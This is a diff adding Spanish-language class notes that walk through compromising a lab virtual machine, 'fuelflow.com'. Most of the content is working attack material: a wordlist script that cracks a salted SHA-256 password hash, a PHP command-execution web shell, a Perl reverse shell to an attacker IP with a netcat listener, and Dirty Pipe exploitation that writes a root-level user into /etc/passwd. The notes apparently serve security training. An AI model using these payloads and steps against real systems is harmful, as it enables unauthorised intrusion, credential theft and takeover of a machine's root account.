@@ -1,0 +1,170 @@
+             ____  ____  _     ____  
+            |  _ \|  _ \| |   |  _ \ 
+            | | | | | | | |   | |_) |
+            | |_| | |_| | |___|  _ < 
+            |____/|____/|_____|_| \_\\
+   _____ ______________  ______  ____________  __
+  / ___// ____/ ____/ / / / __ \/  _/_  __/\ \/ /
+  \__ \/ __/ / /   / / / / /_/ // /  / /    \  / 
+ ___/ / /___/ /___/ /_/ / _, _// /  / /     / /  
+/____/_____/\____/\____/_/ |_/___/ /_/     /_/  
+
+                  DUTHE CLASE 15
+
+_____________________________________________________________________
+CONFIGURACIÓN
+
+Ejecutamos VM y con nmap 192.168.0.1-255 la localizamos, luego:
+
+vim /etc/hosts
+ip.ip.ip.ip fuelflow.com
+
+[esc] :wq
+
+
+_____________________________________________________________________
+RECONOCIMIENTO
+
+$ nmap fuelflow.com
+
+$ ping fuelflow.com
+
+Buscamos CVE CVE-2024-27747
+
+Probamos credenciales por defecto.
+https://ip.ip.ip.ip
+
+Accedemos al source code, accedemos a bup.sql, localizamos el hash,
+localizamos el salto.
+
+_____________________________________________________________________
+CRACKEAR PASSWD 
+
+
+Descargamos rockyou
+
+Hacemos script para crackear el pass con el salto:
+
+# py
+import hashlib
+
+salt = '2123293dsj2hu2nikhiljdsd'
+hashx = 'b5e5346559c8256158b7b24773d4e6ad888383df8873950d2b3a26aff19b1819'
+#hashx='7460b3755ab430efe0d716635d4922b8c34fae0764c74cb3ac9566549fa7c374'
+#hashx='aa7f019c326413d5b8bcad4314228bcd33ef557f5d81c7cc977f7728156f4357'
+wl = 'rockyou.txt'
+
+def hash_password(password):
+    pass_hash = hashlib.sha256(password.encode()).hexdigest()
+    salted_hash = hashlib.sha256(salt.encode() + pass_hash.encode()).hexdigest()
+    return salted_hash
+
+def crack_hash():
+    with open(wl, 'r', encoding='latin1') as file:
+        for line in file:
+            password = line.strip()
+            if hash_password(password) == hashx:
+                print(f'Contraseña encontrada: {password}')
+                return password
+    print('Contraseña no encontrada')
+    return None
+
+# Ejecutar el crackeo
+crack_hash()
+
+
+_____________________________________________________________________
+OBTENER SHELL
+
+Logeamos y armamos shell.php
+
+<?php $r = system($_GET["c"]); echo $r; echo "<form><input type=text name=c><input type=submit></form>"; ?>
+
+En nuestra máquina ponemos nc a la esucucha:
+
+$ nc -l -p 1337
+
+Y ejecutamos reverse en perl (también podemos ejecutarla directamente con system)
+
+perl -e 'use Socket;$i="'ip.ip.ip.ip'";$p='1337';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+
+
+_____________________________________________________________________
+
+MEJORAR SHELL
+
+encapsulamos la sesión en un script y ejecutamos bash
+script /dev/null -c bash
+
+suspendemos la terminal
+control +z
+
+ponemos modo "raw" para que muestre la data "tal cual es, sin formato", desactivamos el echo y traemos al frente de nuevo
+stty raw -echo; fg
+
+configuramos como xterm y bash
+export TERM=xterm
+export SHELL=bash
+
+
+_____________________________________________________________________
+
+ELEVACION DE PRIVILEGIOS
+
+uname -a
+
+Googleamos el kernel para buscar CVE
+____________________________________
+
+Heap out of Bounds:
+
+https://www.exploit-db.com/exploits/50135
+
+El "heap" (montón en español) es una región de la memoria utilizada para la asignación dinámica de memoria en tiempo de ejecución. A diferencia de la pila (stack), que tiene un tamaño fijo y se gestiona de manera automática, el heap es más flexible y se utiliza para almacenar datos cuyo tamaño puede cambiar durante la ejecución de un programa.
+
+No funciona.
+____________________________________
+
+Dirty Pipe | PoC Original:
+
+https://dirtypipe.cm4all.com/
+
+$ vim e.c
+i + ctrl insert
+esc :wq
+
+$ gcc -o e e.c
+$ chmod +x e
+$ ./e 
+$ grep -b "irc" /etc/passwd
+./pwn /etc/passwd 690 'shur3:$6$PmyvzDr1cWqp20B+$XGEKKOx6/G7ysB8QvdnfymWjKpAWuz6.BWqcD2lq4kqZHKe/7IehfI/E5Hq.pY4S/H/zEe9z4F2IkAMqgj17J/:0:0:root:/root:/bin/bash
+
+./e /etc/passwd 653 'ddlr:$y$j9T$q.wRHfIvLgscX9C45qSYh0$1sUBUfl/Akj8Z7ANLKyqr1a42aBDGR1UctDjY5pLtQA:0:0:root:/root:/bin/bash
++ '
+$ su ddlr
+1234
+$ id
+uid=0(root) gid=0(root) grupos=0(root)
+
+
+____________________________________
+
+Dirty Pipe | Exploit by blasty:
+https://haxx.in/files/dirtypipez.c
+
+$ vim h.c
+i + ctrl insert
+esc :wq
+$ gcc -o h h.c
+$ chmod +x h
+$ ./h
+Usage: ./hx SUID
+$ find / -type f -perm -4000 -ls 2>/dev/null
+$ ./h loquesea
+$ id
+
+
+______________________________________________________________________
+
+
+
